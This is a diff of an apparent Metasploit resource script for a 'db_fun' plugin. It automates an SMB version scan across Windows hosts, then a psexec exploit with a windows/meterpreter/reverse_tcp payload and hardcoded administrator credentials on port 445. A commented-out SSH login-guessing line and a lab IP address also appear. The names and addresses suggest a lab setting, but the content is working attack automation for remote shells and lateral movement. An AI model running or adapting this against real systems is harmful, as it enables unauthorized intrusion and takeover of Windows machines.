@@ -1,20 +1,17 @@
 load db_fun
+#set debug to true even tho that's the default.
+db_fun_debug true 
 db_set_auto
 
 # TODO: add, where service 445 (etc) is open
-db_set_run_module scanner/smb/smb_version=" THREADS=2
+db_set_run_module windows scanner/smb/smb_version THREADS=2
+db_set_run_module windows exploit/windows/smb/psexec windows/meterpreter/reverse_tcp SMBPass="administrator" SMBUser="lab" RPORT=445
 
-db_set_run_module linux auxiliary/scanner/ssh/ssh_login BLANK_PASSWORD=false PASSWORD="test" USERNAME="test" RPORT=22 THREADS=5
+#db_set_run_module linux auxiliary/scanner/ssh/ssh_login BLANK_PASSWORD=false PASSWORD="test" USERNAME="test" RPORT=22 THREADS=5
 
-db_search_hosts where address=192.168.170.128
-db_set_create newguy
-db_set_run_module newguy exploit/windows/smb/psexec SMBPass="administrator" SMBUser="lab" RPORT=445
-
-
-
-
-
-
+#db_search_hosts where address=192.168.170.128
+#db_set_create newguy
+#db_set_run_module newguy exploit/windows/smb/psexec SMBPass="administrator" SMBUser="lab" RPORT=445
 
 
 
